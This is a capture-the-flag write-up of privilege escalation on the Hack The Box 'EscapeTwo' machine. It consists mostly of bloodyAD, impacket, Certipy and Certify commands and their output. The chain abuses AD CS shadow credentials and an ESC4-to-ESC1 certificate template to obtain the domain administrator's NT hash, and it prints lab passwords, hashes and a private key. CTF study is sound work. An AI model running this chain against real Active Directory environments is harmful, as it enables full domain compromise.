# PrivEsc
```
## Set Owner
bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc

-----------------------------------------------------------------------------------
## Get Control Rights
- [Grant rights | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)
(sirreda㉿Hunter)-[~/HTB/EscapeTwo]
└─$ impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250116-082951.bak
[*] DACL modified successfully!

-----------------------------------------------------------------------------------
### ESC4 to ESC1
- [AD CS Domain Upgrade – HackTricks]
Obtain Shadow Credentials & NTHash
(root㉿Hunter)-[/home/sirreda/HTB/EscapeTwo]
└─# certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '88892c95-c3c2-78b5-264c-6fe5595461ed'
[*] Adding Key Credential with device ID '88892c95-c3c2-78b5-264c-6fe5595461ed' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '88892c95-c3c2-78b5-264c-6fe5595461ed' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce


--------------------------------------------------------------------------------------
Find a usable template, we need to override its settings
I am using **Certify.exe** to upload to the target machine
Evil-WinRM PS C:\temp> ./Certify.exe find /domain:sequel.htb 
------------------------------------------------------------------------------------------
##You can see **that ca_svc** has overridable permissions for this certificate 
, so let's overwrite it.

[root@kali] /home/kali/EscapeTwo  
❯ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
---------------------------------------------------------------------------------------
## using certipy-ad to req 
certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[+] Trying to resolve 'sequel.htb' at '10.10.xx.xx'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.xx.xx[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.xx.xx[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: '10.10.xx.xx'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
-----------------------------------------------------------------------------------
## or using Certify.exe on the target machine
*Evil-WinRM* PS C:\temp> ./Certify.exe request /ca:DC01.sequel.htb\sequel-DC01-CA /template:DunderMifflinAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : SEQUEL\ryan
[*] No subject name specified, using current context as subject.

[*] Template                : DunderMifflinAuthentication
[*] Subject                 : CN=Ryan Howard, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : DC01.sequel.htb\sequel-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 14

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0MzCxToClaX2NgBIz2hGZzz7OWElrRv4D+TcCJ0VEfdgVZyS
oX2kepPOLRrUcB3oWjMkV9ghUiO8SZMXxNELljIhoPOw3aniemlhqFLwxJWuBGpD
lq3JHHO8gsuwUBZrNurXrSTOJeuLZ4CQ4puVutBRit96hPcEPt586seCNSJMAevM
9UHAeTiASXCDIFfgx7g1wRIhz6wDLCnqld/WTco2g8viBwnnM4D3EM1IBHJOjPtC
1XMKeHfCHIGY2h/A0gYL1DFMAuYe19hiawnMJRoUDdD4laXrdkb3KbPi/U7iSW3n
DbAfvyPqmBuWgYY+dKYAZcgQ/4JKaRjEP+bChQIDAQABAoIBAQCKlKxczHC0tA7i
rnOkvPelQ5MV9UVVTK/qlKH5UZCPeRlGGQI1Drfg50K7Kwh+VUtGupTPfNI4uyEX
z/nBlmFTUXiCY9sqc7uuNU0ss8e7IgD6SzEKy9MkACjIwroFnauRKnL1Ju1vu5Kt
omYHEO5irCrCuiqOH4iA1ZghF0NzUVoIdO+yXWSAZeaNccY3au3T3CuUu/45Ro53
uW9l8kt46OZAvMxtRY8rgQhsLOlklVjxXi/PbD9JO5yOk1tRYXkSzVeuRYYVC+JI
Nozj8ni4zyKqaiG2Y1vT/Fv90tbHXDTNcO+VUv0KadjDN5KNi0Xmn0Kdb0y02OKG
fasYGvxtAoGBAO5fR9VR2VBAugUTVFJ5AZ673qnEmU9uMXLrbdi2gtBv1Jan5wis
c7BernhFTylU2K2VPEBK2xJ9AZvqC/IjxZuabNb2hv6sD5C+Da7TW/KXvoM4YXYU
AaAlHYGzgkWZ8VslfAGw2+WxurI4/f/iHqvzCZTmDLYj69PNGr8QhyAfAoGBAOA9
omUfslfJFHL2u8hDFsgl1wr7uh2JXCYf4e+ody/t4iMAQQg2p/ZPAlgz4xTmwRr5
n3H0m68ik7CIqJiu02snC8ytg9sucMOZWrTZW9Z79Igz0OnYoOWjQ1feVoxlSLpL
BSEmyQrQM+6jWYP4kIJK3o8yMn/Y13XOhJB7yLjbAoGBAOh/gp7sUFvYZhfhPJOc
dxoOACXyHd69ifme6+s+SOVozh+L8Ooi2kwibWXdpFKZ8SWNs9C5smecCd+7Lp+k
iG829gXNOupXhG8XEF1+xeYeX7G5YkY7SUKcMOV64wtkFWdjbkpv6GtnKMQAlq3o
LSZlzOiwYaGd870IBphpVILdAoGBALifRkNH84f/UEzPBBB/3BPxw7mRQ8zpuOrS
uSyeYXMewl7a6LAgf+11Y5LHNaGR00+oUjR6lmt9ZmekPFtpJTxFq5tbCQK+m60P
Z/UaOFjBObWiI9FEwEQRRXLk5hE1msl21sRSsJesj/VcnGjhj+kWR2NSiu1j1RFz
dQWYRMydAoGAKGRN1xtX5cNXwPYMgjgAXLk1HTF1ECN4YTrQRqqvYarvsbQi3hWn
p4cWiUpfsyQeHy6lTkzzEiOil+2diophzEw5XKYlAwXiorOyQvEBEPFI8isKhynU
76ocbkX4YWTAI2vuq6Jifurh2j0X8wER9+MBIYk67Bp3o6bqGnOKjw4=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFcjCCBFqgAwIBAgITVAAAAA5NKZGUGMr1PgAAAAAADjANBgkqhkiG9w0BAQsF
ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNTAxMTYxNDI5MjBaFw0yNzAx
MTYxNDM5MjBaMFMxEzARBgoJkiaJk/IsZAEZFgNodGIxFjAUBgoJkiaJk/IsZAEZ
FgZzZXF1ZWwxDjAMBgNVBAMTBVVzZXJzMRQwEgYDVQQDEwtSeWFuIEhvd2FyZDCC
ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANDMwsU6ApWl9jYASM9oRmc8
+zlhJa0b+A/k3AidFRH3YFWckqF9pHqTzi0a1HAd6FozJFfYIVIjvEmTF8TRC5Yy
IaDzsN2p4nppYahS8MSVrgRqQ5atyRxzvILLsFAWazbq160kziXri2eAkOKblbrQ
UYrfeoT3BD7efOrHgjUiTAHrzPVBwHk4gElwgyBX4Me4NcESIc+sAywp6pXf1k3K
NoPL4gcJ5zOA9xDNSARyToz7QtVzCnh3whyBmNofwNIGC9QxTALmHtfYYmsJzCUa
FA3Q+JWl63ZG9ymz4v1O4klt5w2wH78j6pgbloGGPnSmAGXIEP+CSmkYxD/mwoUC
AwEAAaOCAkowggJGMD0GCSsGAQQBgjcVBwQwMC4GJisGAQQBgjcVCIOFgESHvJM3
hdGJJcLeUoTxqjiBKYb4snGD5uhaAgFkAgECMA4GA1UdDwEB/wQEAwIHgDAdBgNV
HQ4EFgQU3qN6shKrLEahYPdnRFImTk1wJ2kwKAYDVR0RBCEwH6AdBgorBgEEAYI3
FAIDoA8MDUFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUxkG5tuQOR9YGWmzxisaU
/Rr7uMMwgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049c2VxdWVs
LURDMDEtQ0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRi
P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
aXN0cmlidXRpb25Qb2ludDCBvwYIKwYBBQUHAQEEgbIwga8wgawGCCsGAQUFBzAC
hoGfbGRhcDovLy9DTj1zZXF1ZWwtREMwMS1DQSxDTj1BSUEsQ049UHVibGljJTIw
S2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1z
ZXF1ZWwsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0
aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQCAPxRaIALXpkBZ
5WPRfj1ltNqsUyKFasCeplSiI5InzTnUx5eT3ue5zb6y/Zd5YL6xcnEArovONO+z
9VrqDWa/81hXlnRS43mK9uqMflm6Lbg3AITKciagzR8iZ+8Th8RppJm0xIafyHzd
g5hRl6zduBMAnky7A1QH6Ywrv0REa8dxNTkXOYKMAuCIMn/LBAqOpwCdgmuBMhGj
pJqV1NneswlMVLRS1V9cC7O8VuxgOrw6D2EtV2wSM8kayP/k4OOwvkIHr4KRFmzK
YoB8DOyyjYq5LRFPotO2nlozBAf2TBLjn6g192JE2yvnE9YCpyS4buGYI94iLTIs
LtlIcZP+
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:11.3802176

-------------------------------------------------------------------------------------
puting the key& the cert in a file called cert.pfx and then after it convert it to .pfx:

(sirreda㉿Hunter)-[~/HTB/EscapeTwo]
└─$ certipy-ad auth -pfx cert.pfx -dc-ip 10.10.11.51 -domain sequel.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

-------------------------------------------------------------------------------------
─(sirreda㉿Hunter)-[~/HTB/EscapeTwo]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:
-------------------------------------------------------------------------------------
## 
(sirreda㉿Hunter)-[~/HTB/EscapeTwo]
└─$ certipy-ad auth -pfx cert.pfx -dc-ip 10.10.11.51 -domain sequel.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff


```
